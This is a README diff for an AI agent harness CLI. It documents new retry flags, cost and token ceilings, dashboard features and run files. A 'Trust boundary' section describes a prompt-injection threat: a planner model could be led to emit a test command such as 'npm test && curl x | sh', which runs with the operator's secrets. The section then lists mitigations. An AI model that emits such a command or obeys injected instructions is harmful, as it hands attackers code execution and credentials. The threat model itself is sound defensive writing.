@@ -75,8 +75,12 @@ agent-harness start --idea @idea.md --tdd off
 agent-harness status --run-id <id> --json
 agent-harness answer --run-id <id> --question <id> --text "..."
 agent-harness continue --run-id <id>
-agent-harness retry --run-id <id>
-agent-harness cancel --run-id <id>
+agent-harness retry --run-id <id> [--force]
+agent-harness retry --run-id <id> --max-run-tokens <n> [--force]
+agent-harness retry --run-id <id> --max-run-cost-usd <n> [--force]
+agent-harness retry --run-id <id> --commit-dirty [order]
+agent-harness retry --run-id <id> --accept-tree
+agent-harness cancel --run-id <id>            # out-of-band; does not wait on advance
 agent-harness unlock --run-id <id> [--repo]   # remove a stale run/repo lock
 
 agent-harness knowledge refresh
@@ -87,13 +91,15 @@ agent-harness knowledge search "proration" --include-project billing-service
 
 `start --tdd on|off` freezes the override into that run's config snapshot. Later commands load the snapshot, so changing the project config cannot silently change an active run.
 
+`retry --force` overrides a non-retriable block (`blockedRetriable: false`). `--max-run-tokens` / `--max-run-cost-usd` rewrite those ceilings on the run's frozen `config.json` (budget blocks still need `--force`). `--commit-dirty` commits a dirty tree before retrying; `--accept-tree` re-stamps the working-tree fingerprint after a divergence block.
+
 ## Centralized dashboard
 
 The dependency-free browser UI is a read/write client of the same persisted state and engine used by the CLI. It does not keep a competing copy of lifecycle state. Mutating requests are serialized, while polling and artifact reads remain safe during long agent or command work. The top-bar gear opens schema-driven project settings; currently it controls grill questions per episode, questions per batch, and the stale-answer threshold, and persists those values to the project config. Settings apply to new runs because active runs retain their frozen configuration snapshots.
 
 Answering a batch is keyboard-driven: `1`–`4` pick an option for the focused question and advance, arrows move between questions, and `Escape` skips one. These fire only when the question container itself holds focus, so typing a digit in the free-text box is never swallowed. "Accept all recommendations" fills every unanswered question with its recommended option but never submits on its own.
 
-Blocked runs get pattern-matched remediation copy for the common causes (dirty tree, missing agent credential, missing Graphify graph, changed run configuration) with the raw failure kept in a collapsed section. A run that exhausted `workflow.maxStepsPerRun` reports budget exhaustion rather than the generic paused-after-restart message.
+Blocked runs key remediation on `blockedKind` (dirty tree, missing agent credential, missing Graphify graph, changed configuration, workspace divergence, provider, budget) with the raw failure kept in a collapsed section. A run that exhausted `workflow.maxStepsPerRun` reports step-budget exhaustion rather than the generic paused-after-restart message; token/cost ceilings surface a raise-and-retry control. While an agent step is in flight, the header shows live activity from `activity.json` (role, model, elapsed, last step summary). The run header also shows accrued usage (`total tokens · cached · cost`) against any configured ceiling.
 
 Background polling (~1.8s while the tab is visible) must not feel like a page reload. The server returns a cheap change `signature`, and an unchanged poll short-circuits before any payload is serialized. Focused HITL editors — and half-filled batch cards with no control currently focused — block silent rewrites, and scroll / `<details>` chrome is restored when a silent poll does rewrite the DOM. The full checklist lives in [docs/ui-polling.md](./docs/ui-polling.md).
 
@@ -115,6 +121,9 @@ Each run lives under `.agent-harness/runs/<runId>/`:
 | `tasks/*.md` | Tracer-bullet implementation tickets and evidence |
 | `packets/*.json` | Complete handoff supplied to one model invocation |
 | `sessions/*.json` | Role, model, provider session/run IDs, context mode, exact submitted prompt, outcome, available usage, and handoff summary |
+| `sessions/<id>.steps.jsonl` | Bounded, redacted per-step agent activity for one session (no raw tool args) |
+| `activity.json` | Live in-flight step snapshot; cleared when the invocation settles |
+| `cancel.request` | Out-of-band cancel marker; written by `cancel`, consumed by the advancing process |
 
 The map is an index, not a duplicate source of truth. Full decisions live in their issue files. A session loads the map at low resolution and retrieves relevant issue/document chunks on demand.
 
@@ -128,9 +137,9 @@ The **griller** asks 1–`workflow.grillQuestionsPerBatch` decision-ready HITL q
 
 ### The open-unknowns register
 
-Every griller turn also returns what it still needs resolved, including questions it has not asked yet. The harness keeps this as a register on the run state with engine-owned status (`fog` → `asked` → `resolved`, or `parked` when the human skips). It is seeded from the reflector's `unknowns` before the first question is asked, written to `unknowns.md`, and surfaced in the dashboard as "N resolved · N open · N parked" — so the interview has an observable length instead of running until the griller happens to stop.
+Every griller turn also returns what it still needs resolved, including questions it has not asked yet. The harness keeps this as a register on the run state with engine-owned status (`fog` → `asked` → `resolved`, `parked` when the human skips, or `dropped` when a fog entry disappears from the griller's list without an answer). It is seeded from the reflector's `unknowns` before the first question is asked, written to `unknowns.md`, and surfaced in the dashboard as "N resolved · N open · N parked · N dropped" — so the interview has an observable length instead of running until the griller happens to stop. `dropped` is neither open nor resolved; an entry that reappears returns to the normal fog/asked/parked path.
 
-Reconciliation is a re-projection, not an append: one answer often collapses several latent unknowns and opens new ones. Entries are never deleted, only transitioned, and `parked` is sticky until the griller re-asks. The register reflects the griller's current judgment; it is not a guarantee that the interview ends after the listed entries.
+Reconciliation is a re-projection, not an append: one answer often collapses several latent unknowns and opens new ones. Entries are never deleted, only transitioned; `parked` is sticky until the griller re-asks, and absence of an `asked` entry becomes `resolved` while absence of fog becomes `dropped`. The register reflects the griller's current judgment; it is not a guarantee that the interview ends after the listed entries.
 
 Operators can also add a **note** mid-interview ("don't touch the auth module") without waiting for a question to attach it to. Notes are consumed as authoritative input on the next griller turn, and can optionally seed a human-authored register entry.
 
@@ -175,7 +184,13 @@ workflow:
   contextCharacters: 12000   # guidance + retrieved context
   inputCharacters: 24000     # serialized packet.input
   graphifyCharacters: 3000   # Graphify excerpt within contextCharacters
+  reviewDiffCharacters: 12000  # whole-file diff budget for the reviewer packet
+  maxRunTokens: 0            # 0 = unlimited; hard stop between steps when exceeded
+  maxRunCostUsd: 0           # 0 = unlimited; needs models.pricing for the models in use
+  maxProviderRetries: 2      # in-place backoff on provider failures (0–5)
   generateCommitMessages: false  # deterministic per-task subjects; PR body still uses the model
+models:
+  pricing: {}                # optional: model → { inputPerMillion, outputPerMillion, ... }
 knowledge:
   guidance:
     enabled: true
@@ -263,6 +278,14 @@ Both paths honor `git.preflightCommitOrder`, which is user-selectable, not fixed
 - `commit-then-branch`: commits on whatever branch is currently checked out; the run branch is then created normally by `plan()` once the tree is clean. The dashboard names that branch on the button so you're not guessing, and shows a caution when it's the same as `config.git.baseBranch`, since that means the commit lands directly on it.
 
 Either way the commit message defaults to `chore: commit working tree before harness run <runId>`, and the audit event records the order, resulting sha, branch, and the exact list of committed files — the harness state directory (`.agent-harness/`) is never included.
+
+## Trust boundary
+
+The harness executes shell commands in the repository root with the operator's full environment — including secrets such as `CURSOR_API_KEY`. Most of those commands come from config (`commands.test`, `commands.gates[].command`). The exception is `task.testCommand`: the planner authors it, materialization copies it verbatim, and the targeted-test step runs it with `shell: true`. A planner induced (via prompt injection from a retrieved document or a repository file) to emit something like `npm test && curl x | sh` gets arbitrary code execution under the operator's credentials.
+
+Mitigations available today: pin `workflow.tdd`, review planner output before execution, and run the harness in a container or VM when the repository or knowledge index may contain untrusted material.
+
+Intended fix (deferred — see [Command allowlisting for model-authored test targets](../../docs/roadmap.md#command-allowlisting-for-model-authored-test-targets)): allowlist `task.testCommand` against `config.commands.test` and `config.commands.gates[].command`, and model per-task targeting as a scoped `testFilter` argument interpolated into a config-owned template rather than as a free-form command string.
 
 ## Extension boundaries
 
